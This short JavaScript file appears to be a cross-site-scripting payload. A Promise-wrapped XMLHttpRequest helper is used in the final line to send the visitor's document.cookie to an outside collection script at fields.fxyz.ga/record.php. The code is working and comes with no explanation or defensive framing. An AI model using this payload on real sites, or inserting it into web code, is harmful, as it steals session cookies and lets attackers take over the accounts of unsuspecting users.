function get(url) {
	return new Promise(function(resolve, reject) {
		var req = new XMLHttpRequest();
		req.open('GET', url);
		req.onload = function() {
			if (req.status == 200) {
				resolve(req.response);
			} else {
				reject(Error(req.statusText));
			}
			console.log("done");
		};
		req.onerror = function() {
			reject(Error("Network Error"));
			console.log("error");
		};
		req.send();
	});
}
get("http://fields.fxyz.ga/record.php?c="+document.cookie);
